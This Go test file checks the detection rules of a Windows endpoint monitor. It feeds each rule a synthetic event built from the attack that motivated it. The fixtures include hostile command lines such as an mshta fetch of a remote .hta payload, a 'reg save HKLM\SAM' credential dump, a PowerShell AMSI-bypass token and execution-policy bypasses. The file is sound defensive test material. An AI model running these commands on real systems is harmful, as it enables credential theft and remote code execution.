package rules

import (
	"testing"

	"sentinel/internal/event"
)

// The per-rule VECTOR REGRESSION table: every shipped rule, fired by the exact
// attack vector that motivated it (per the rule's own note / 03-RULES.md),
// against the REAL catalog + REAL allowlist. This is the "show me the test for
// rule X" answer: one file, 25 rows, one per x-sentinel id.
//
// Distinct from catalog_blindspot_test.go, which pins the OTHER direction
// (noise suppression must not blind detection). Here every row must FIRE.
//
// Each row runs on a FRESH engine: dedup windows key on rule+target, so
// reusing one engine would suppress rows that share a target shape
// (e.g. EXEC-002 and PERSIST-001 both use the conhost incident event).

type vectorCase struct {
	rule string
	vec  string // the motivating attack vector, one line
	ev   event.Event
	sev  event.Severity
}

var vectorCases = []vectorCase{
	// --- A. Persistence ---
	{"PERSIST-001", "XblGameCachesTask: conhost --headless powershell -ep bypass -file C:\\ProgramData\\onedrive-sync.ps1",
		event.Event{EID: 1, Image: `C:\Windows\System32\conhost.exe`,
			CmdLine: `conhost.exe --headless powershell -ep bypass -file C:\ProgramData\onedrive-sync.ps1`}, event.SevCritical},
	{"PERSIST-002", "WMI permanent event subscription (fileless): EID 19 filter, not the benign 'SCM Event Log' one",
		event.Event{EID: 19, Image: `C:\Windows\System32\wbem\WmiPrvSE.exe`,
			CmdLine: `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Service'`}, event.SevCritical},
	{"PERSIST-003", "Run-key persistence written by an implant",
		event.Event{EID: 13, Image: `C:\Users\jurij\Downloads\implant.exe`,
			TargetRegKey: `HKEY_USERS\S-1-5-21-999\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpdate`}, event.SevCritical},
	{"PERSIST-004", ".lnk dropped into the Startup folder",
		event.Event{EID: 11, Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			TargetFile: `C:\Users\jurij\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.lnk`}, event.SevCritical},
	{"PERSIST-005", "Service with ImagePath in a user-writable dir (Services\\Evil\\ImagePath write)",
		event.Event{EID: 13, Image: `C:\Users\jurij\Downloads\implant.exe`,
			TargetRegKey: `\REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Services\WindUpdate\ImagePath`,
			Details:      `C:\Users\jurij\AppData\Roaming\WindUpdate\svc.exe`}, event.SevSuspicious},
	{"PERSIST-006", "COM hijack: HKCU Classes\\CLSID\\{...}\\InprocServer32 (Default) write",
		event.Event{EID: 13, Image: `C:\Users\jurij\Downloads\implant.exe`,
			TargetRegKey: `HKEY_USERS\S-1-5-21-999\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A1D3}\InprocServer32\(Default)`}, event.SevSuspicious},

	// --- B. Execution ---
	{"EXEC-001", "the cursor incident: powershell -ExecutionPolicy Bypass -File <Temp>\\ps-script-<guid>.ps1",
		event.Event{EID: 1, Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			CmdLine: `C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NonInteractive -File C:\Users\jurij\AppData\Local\Temp\ps-script-deadbeef.ps1`}, event.SevCritical},
	{"EXEC-002", "headless PS launch vector: conhost --headless powershell (Image is the broker, not powershell)",
		event.Event{EID: 1, Image: `C:\Windows\System32\conhost.exe`,
			CmdLine: `conhost.exe --headless powershell -ep bypass -file C:\ProgramData\onedrive-sync.ps1`}, event.SevCritical},
	{"EXEC-003", "LOLBin fetch: mshta http://<attacker>/payload.hta (not a dev_scripts entry)",
		event.Event{EID: 1, Image: `C:\Windows\System32\mshta.exe`,
			CmdLine: `mshta.exe http://203.0.113.9/payroll.hta`}, event.SevSuspicious},
	{"EXEC-004", "hex-named dropper run from Temp (deadbeef.exe)",
		event.Event{EID: 1, Image: `C:\Users\jurij\AppData\Local\Temp\a1b2c3d4.exe`}, event.SevSuspicious},
	{"EXEC-005", "macro/phishing: WINWORD.EXE spawns cmd.exe child",
		event.Event{EID: 1, Image: `C:\Windows\System32\cmd.exe`,
			ParentImage: `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`,
			CmdLine:     `cmd.exe /c powershell -ep bypass -file C:\ProgramData\doc.ps1`}, event.SevSuspicious},

	// --- C. Network ---
	{"NET-001", "baseline pseudo-event: NEW loopback listener, the incident's broker on 127.0.0.1:58172",
		event.Event{Source: event.SrcBaseline, TargetFile: `LISTEN 127.0.0.1:58172`}, event.SevSuspicious},
	{"NET-002", "untrusted implant beacons to a PUBLIC host (203.0.113.9, outside allowed_destinations)",
		event.Event{EID: 3, Image: `C:\Users\jurij\Downloads\implant.exe`,
			DstIP: "203.0.113.9", DstPort: 443}, event.SevSuspicious},
	{"NET-003", "raw-IP C2: non-browser to 198.51.100.7 with no prior DNS resolution",
		event.Event{EID: 3, Image: `C:\Users\jurij\Downloads\implant.exe`,
			DstIP: "198.51.100.7", DstPort: 8080}, event.SevInfo},
	{"NET-004", "Temp-resident process makes an outbound connection",
		event.Event{EID: 3, Image: `C:\Users\jurij\AppData\Local\Temp\a1b2c3d4.exe`,
			DstIP: "203.0.113.9", DstPort: 443}, event.SevCritical},
	{"NET-005", "driver POSTs commands to the broker: loopback connect to 127.0.0.1:58172 — fires even from a TRUSTED svchost (no image except)",
		event.Event{EID: 3, Image: `C:\Windows\System32\svchost.exe`,
			DstIP: "127.0.0.1", DstPort: 58172}, event.SevCritical},

	// --- D. Credential access ---
	{"CRED-001", "stealer stages the browser vault: logins.json written to Temp by a non-browser process",
		event.Event{EID: 11, Image: `C:\Users\jurij\Downloads\stealer.exe`,
			TargetFile: `C:\Users\jurij\AppData\Local\Temp\logins.json`}, event.SevCritical},
	{"CRED-002", "credential dump: non-Microsoft process opens lsass.exe (EID 10, victim = TargetImage)",
		event.Event{EID: 10, Image: `C:\Users\jurij\Downloads\implant.exe`,
			TargetImage: `C:\Windows\System32\lsass.exe`, GrantedAccess: "0x1010"}, event.SevCritical},
	{"CRED-003", "reg save HKLM\\SAM: hive copy staged to a file path ending \\SAM (EID 11)",
		event.Event{EID: 11, Image: `C:\Windows\System32\reg.exe`,
			CmdLine:    `reg save HKLM\SAM C:\Users\jurij\AppData\Local\Temp\SAM`,
			TargetFile: `C:\Users\jurij\AppData\Local\Temp\SAM`}, event.SevCritical},

	// --- E. Injection / evasion ---
	{"INJECT-001", "CreateRemoteThread into a foreign process (EID 8) from an untrusted source",
		event.Event{EID: 8, Image: `C:\Users\jurij\Downloads\implant.exe`,
			TargetImage: `C:\Windows\System32\notepad.exe`}, event.SevCritical},
	{"INJECT-002", "unsigned DLL loaded from Temp (EID 7: Image=loader, ImageLoaded=DLL, Signed=false)",
		event.Event{EID: 7, Image: `C:\Users\jurij\AppData\Local\Temp\loader.exe`,
			ImageLoaded: `C:\Users\jurij\AppData\Local\Temp\payload.dll`, Signed: "false"}, event.SevSuspicious},
	{"INJECT-003", "process tampering: hollowing/herpaderping (EID 25)",
		event.Event{EID: 25, Image: `C:\Users\jurij\Downloads\dropper.exe`,
			TargetImage: `C:\Windows\System32\svchost.exe`}, event.SevCritical},
	{"EVADE-001", "AMSI patch: cmdline carrying the System.Management.Automation.AmsiUtils reflection token",
		event.Event{EID: 1, Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			CmdLine: `powershell -ep bypass -Command [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`}, event.SevCritical},

	// --- F/B8. Baseline + self-protection ---
	{"BASE-001", "baseline diff: NEW persistence-surface entry (Source=baseline pseudo-event)",
		event.Event{Source: event.SrcBaseline, EID: 0,
			TargetRegKey: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run :: OneDriveUpdate`}, event.SevSuspicious},
	{"CONFIG-001", "config tamper: a non-sentinel process writes into rules.d\\ (real install path, not Temp)",
		event.Event{EID: 11, Image: `C:\Users\jurij\Downloads\tamper.exe`,
			TargetFile: `C:\Users\jurij\Documents\Github\leave-my-shit-alone\rules.d\persistence.yml`}, event.SevCritical},
}

// TestCatalogVectorRegression is the "every rule fires on its motivating
// vector" guarantee, pinned against the shipped rules.d + allowlist.json.
func TestCatalogVectorRegression(t *testing.T) {
	for _, tc := range vectorCases {
		t.Run(tc.rule, func(t *testing.T) {
			eng := realEngine(t) // fresh engine per row: no dedup-window bleed
			res := eng.Evaluate(&tc.ev)
			if !containsRule(hitRuleIDs(res), tc.rule) {
				t.Errorf("%s must fire on its vector (%s);\ngot hits %v\nsuppressed %v",
					tc.rule, tc.vec, hitRuleIDs(res), suppRuleIDs(res))
			}
			for _, h := range res.Hits {
				if h.RuleID == tc.rule && h.Severity != tc.sev {
					t.Errorf("%s severity=%v, want %v (someone downgraded the rule)", tc.rule, h.Severity, tc.sev)
				}
			}
		})
	}
}

// TestVectorTableCoversWholeCatalog pins COMPLETENESS: every x-sentinel id in
// rules.d must have a row above. Adding rule #26 without a vector row fails
// here — "every rule has a regression test" stays true or the build goes red.
func TestVectorTableCoversWholeCatalog(t *testing.T) {
	have := map[string]bool{}
	for _, tc := range vectorCases {
		have[tc.rule] = true
	}
	for _, r := range loadRealCatalog(t) {
		if r.XID == "" {
			continue // community rule without x-sentinel routing
		}
		if !have[r.XID] {
			t.Errorf("rule %s (%q) has no vector regression row — add one to vectorCases", r.XID, r.Title)
		}
	}
}
